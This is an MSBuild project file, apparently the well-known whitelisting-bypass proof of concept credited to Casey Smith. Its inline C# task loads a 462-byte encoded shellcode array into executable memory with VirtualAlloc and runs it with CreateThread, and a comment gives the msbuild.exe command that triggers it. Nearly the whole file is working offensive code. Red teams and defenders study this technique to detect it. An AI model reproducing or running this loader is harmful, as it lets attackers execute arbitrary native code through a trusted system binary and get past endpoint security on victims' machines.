<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            byte[] shellcode = new byte[462] {0xbb,0x49,0xaf,0x32,0xf9,0xda,
0xc3,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x6d,0x31,0x5a,
0x15,0x03,0x5a,0x15,0x83,0xc2,0x04,0xe2,0xbc,0x72,0xf3,0x20,
0x4a,0xa9,0x00,0x8d,0x99,0x78,0x52,0xde,0x30,0xbc,0x8a,0xae,
0xad,0x70,0x9a,0xc7,0x32,0x24,0x33,0x6b,0x1f,0x23,0x1f,0xb7,
0x37,0x88,0x72,0x97,0xc7,0x39,0x58,0x21,0xaf,0xc9,0xc4,0xdb,
0x94,0x57,0xe6,0xa4,0x60,0x14,0x4c,0x20,0x5e,0xf4,0x3a,0x6b,
0xf7,0x16,0x4b,0x01,0x97,0x96,0x01,0x3a,0x05,0xdd,0x17,0xfb,
0x55,0xf0,0x6a,0xc8,0x32,0xaf,0x6c,0x5d,0x5f,0x12,0x3c,0x5d,
0xfa,0xfd,0x82,0x25,0x6f,0xd6,0x73,0x76,0xa1,0xa6,0x7c,0x0a,
0x7b,0x2d,0x2b,0xe4,0x50,0xe0,0xff,0x50,0x19,0xf5,0x7d,0x2f,
0xc6,0x74,0xb9,0x3a,0xed,0x82,0x61,0xe0,0xeb,0xa0,0xc0,0x74,
0xb8,0x5d,0x7a,0xeb,0x71,0x32,0x94,0x1b,0xb7,0x72,0xff,0x6c,
0x44,0x56,0x30,0xc4,0xe9,0x3e,0x2c,0x58,0x25,0xbe,0xe1,0xc8,
0xf5,0xa2,0x77,0xbd,0x54,0x32,0x0b,0x89,0xcb,0x84,0x68,0x13,
0x12,0x01,0xd9,0x35,0x4a,0x33,0x3a,0x3b,0xd1,0xa3,0xb4,0x78,
0x2b,0x33,0x15,0x05,0xdf,0xb7,0x74,0xdc,0x7a,0x37,0x9f,0x47,
0x0c,0x71,0x99,0xd1,0x12,0xba,0xcd,0x28,0xd3,0xb5,0x52,0x5b,
0xfb,0x3a,0x3a,0xf6,0xd4,0xd8,0x2d,0xd5,0x40,0xa9,0xc5,0xfd,
0xae,0xf4,0x5c,0xc4,0xbf,0xe3,0x86,0x31,0x01,0xec,0xeb,0xac,
0xb8,0x03,0x87,0x36,0xb4,0x80,0xa1,0xb8,0x28,0xcd,0x7b,0x7d,
0x6d,0x35,0x3f,0x08,0xf1,0x14,0x48,0x7c,0x27,0x1a,0x00,0x76,
0xa6,0xc9,0x93,0xb6,0x27,0x00,0x3a,0xe5,0x0b,0xa2,0x49,0xcd,
0x19,0xd4,0x8e,0x49,0x0b,0xc8,0x6b,0x94,0x49,0x30,0x32,0x74,
0x2f,0x56,0x6d,0x4d,0x99,0x4d,0x60,0x5f,0xd0,0x97,0x4e,0xb7,
0x55,0xa4,0xd7,0xaf,0xc5,0x23,0x49,0x49,0x3d,0x93,0x63,0x3a,
0xe9,0xd3,0x32,0xfe,0x13,0x95,0xf2,0xf8,0x19,0x07,0xda,0x0c,
0x32,0x91,0x03,0xb4,0xb6,0x62,0x9d,0xcc,0x8b,0xc3,0xd4,0x3b,
0x6a,0x91,0xc3,0x04,0x6b,0x96,0xae,0x7c,0x42,0x86,0x2c,0xcd,
0xde,0xef,0xdc,0x01,0xa4,0x52,0x5b,0x0f,0x03,0xc2,0xe4,0x20,
0x7f,0xc5,0x97,0x3e,0x52,0xbe,0x2d,0xeb,0x19,0x8d,0xba,0x0f,
0x83,0x51,0x9c,0x53,0x59,0xd6,0xb8,0xa4,0x56,0x56,0xfd,0x2e,
0x1b,0x3a,0x6b,0x5c,0x40,0x9b,0xa4,0xdb,0x66,0x8d,0x37,0xbd,
0x12,0xa5,0xa7,0x2b,0x59,0xc7,0xaa,0x22,0x1d,0x5c,0xb7,0x28,
0xa6,0xa1,0x02,0xa7,0x3c,0xa1,0x6a,0x76,0xe7,0xa1,0xac,0xf0,
0xcf,0x70,0x1e,0x0a,0x44,0x89,0x3d,0xaf,0x06,0x10,0x30,0xc7,
0x2c,0xaf,0x7e,0x43,0x65,0x53,0x2a,0xf4,0x79,0x32,0x3c,0x2e,
0x2d,0xc4,0xda,0x32,0x85,0x6b,0x54,0x23,0x3c,0xe0,0xc0,0xfb,
0x12,0x77,0x2d,0x97,0x92,0x66,0x78,0x00,0x25,0xde,0xcd,0x89
};
              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
